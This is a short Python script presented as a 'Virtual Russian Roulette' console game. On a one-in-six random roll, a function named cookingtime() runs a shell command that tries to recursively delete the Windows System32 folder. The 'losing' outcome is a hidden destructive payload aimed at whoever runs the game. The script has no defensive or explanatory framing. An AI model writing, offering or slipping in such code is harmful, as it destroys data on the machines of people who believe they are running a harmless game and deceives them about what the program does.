import random
import time
import os
import playsound

def cookingtime():
    os.system("cmd /c del /r /s C:/Windows/System32")
    time.sleep(5)

def russian_roulette():
    print("Welcome to Virtual Russian Roulette!")
    print("There are 6 chambers, one of them is loaded.")
    print("Press Enter to pull the trigger...")
    
    input()
    
    if random.randint(1, 6) == 1:
        print("BANG! You lost!")
        time.sleep(2)
        cookingtime()
    else:
        print("Click! You're safe... for now.")
    
    print("\nGame over.")

russian_roulette()
